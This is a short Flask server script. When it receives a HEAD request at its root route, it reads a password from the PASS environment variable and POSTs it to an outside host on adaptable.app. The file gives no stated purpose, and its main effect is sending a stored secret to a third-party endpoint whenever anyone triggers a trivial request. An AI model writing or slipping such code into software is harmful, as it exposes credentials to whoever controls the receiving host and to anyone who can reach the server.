import requests
import os
from flask import Flask, request, Response
app = Flask(__name__)

data = {"pass": os.environ.get('PASS')}

@app.route('/', methods=['HEAD'])
def handle_request():
    requests.post("https://mjrecentevday23412312.adaptable.app", data=data)
    return ""
    

app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))

